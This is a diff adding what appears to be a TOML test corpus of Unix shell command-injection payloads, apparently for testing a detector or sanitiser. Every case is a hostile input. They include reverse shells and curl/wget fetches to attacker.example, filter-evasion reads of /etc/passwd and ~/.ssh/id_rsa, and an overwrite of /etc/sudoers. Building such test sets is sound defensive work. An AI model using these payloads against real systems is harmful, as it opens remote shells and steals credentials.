@@ -1,0 +1,192 @@
+schema = 1
+# Unix shell command injection.
+
+[[case]]
+id = "semi_id"
+class = "cmdi"
+payload = "; id"
+
+[[case]]
+id = "newline_id"
+class = "cmdi"
+payload = "\nid\n"
+
+[[case]]
+id = "pipe_id"
+class = "cmdi"
+payload = "| id"
+
+[[case]]
+id = "and_id"
+class = "cmdi"
+payload = "&& id"
+
+[[case]]
+id = "or_id"
+class = "cmdi"
+payload = "|| id"
+
+[[case]]
+id = "backtick_id"
+class = "cmdi"
+payload = "`id`"
+
+[[case]]
+id = "subshell_id"
+class = "cmdi"
+payload = "$(id)"
+
+[[case]]
+id = "subshell_nested"
+class = "cmdi"
+payload = "$(echo $(id))"
+
+[[case]]
+id = "redir_id"
+class = "cmdi"
+payload = "; id > /tmp/x"
+
+[[case]]
+id = "stderr_redir"
+class = "cmdi"
+payload = "; id 2>&1"
+
+[[case]]
+id = "background_id"
+class = "cmdi"
+payload = "; id &"
+
+[[case]]
+id = "exec_id"
+class = "cmdi"
+payload = "; exec id"
+
+[[case]]
+id = "eval_id"
+class = "cmdi"
+payload = "; eval id"
+
+[[case]]
+id = "exec_curl"
+class = "cmdi"
+payload = "; curl http://attacker.example/x"
+
+[[case]]
+id = "exec_wget"
+class = "cmdi"
+payload = "; wget http://attacker.example/x"
+
+[[case]]
+id = "exec_nc"
+class = "cmdi"
+payload = "; nc -e /bin/sh attacker.example 4444"
+
+[[case]]
+id = "exec_bash_revshell"
+class = "cmdi"
+payload = "; bash -c 'bash -i >& /dev/tcp/attacker.example/4444 0>&1'"
+
+[[case]]
+id = "exec_python_revshell"
+class = "cmdi"
+payload = "; python -c 'import socket,os,pty;s=socket.socket();s.connect((\"attacker.example\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'"
+
+[[case]]
+id = "ifs_replacement"
+class = "cmdi"
+payload = ";cat${IFS}/etc/passwd"
+
+[[case]]
+id = "ifs_index"
+class = "cmdi"
+payload = ";cat$IFS$9/etc/passwd"
+
+[[case]]
+id = "brace_expansion"
+class = "cmdi"
+payload = ";{cat,/etc/passwd}"
+
+[[case]]
+id = "brace_glob"
+class = "cmdi"
+payload = "; /???/??t /???/p?ss??"
+
+[[case]]
+id = "char_class_glob"
+class = "cmdi"
+payload = "; cat /e[t]c/p[a]sswd"
+
+[[case]]
+id = "tilde_home"
+class = "cmdi"
+payload = "; cat ~/.ssh/id_rsa"
+
+[[case]]
+id = "perl_eval"
+class = "cmdi"
+payload = "; perl -e 'system(\"id\")'"
+
+[[case]]
+id = "ruby_eval"
+class = "cmdi"
+payload = "; ruby -e 'system(\"id\")'"
+
+[[case]]
+id = "php_eval"
+class = "cmdi"
+payload = "; php -r 'system(\"id\");'"
+
+[[case]]
+id = "node_eval"
+class = "cmdi"
+payload = "; node -e 'require(\"child_process\").execSync(\"id\")'"
+
+[[case]]
+id = "awk_system"
+class = "cmdi"
+payload = "; awk 'BEGIN{system(\"id\")}'"
+
+[[case]]
+id = "sed_command"
+class = "cmdi"
+payload = "; sed '/x/e id' /etc/passwd"
+
+[[case]]
+id = "find_exec"
+class = "cmdi"
+payload = "; find / -exec id {} ;"
+
+[[case]]
+id = "xargs_id"
+class = "cmdi"
+payload = "; echo id | xargs sh -c"
+
+[[case]]
+id = "tee_root"
+class = "cmdi"
+payload = "; echo x | sudo tee /etc/sudoers"
+
+[[case]]
+id = "encoded_semi"
+class = "cmdi"
+payload = "%3B id"
+
+[[case]]
+id = "encoded_pipe"
+class = "cmdi"
+payload = "%7C id"
+
+[[case]]
+id = "double_encoded_semi"
+class = "cmdi"
+payload = "%253B id"
+
+[[case]]
+id = "carriage_return"
+class = "cmdi"
+payload = "\rid\r"
+
+[[case]]
+id = "tab_separated"
+class = "cmdi"
+payload = ";\tid"
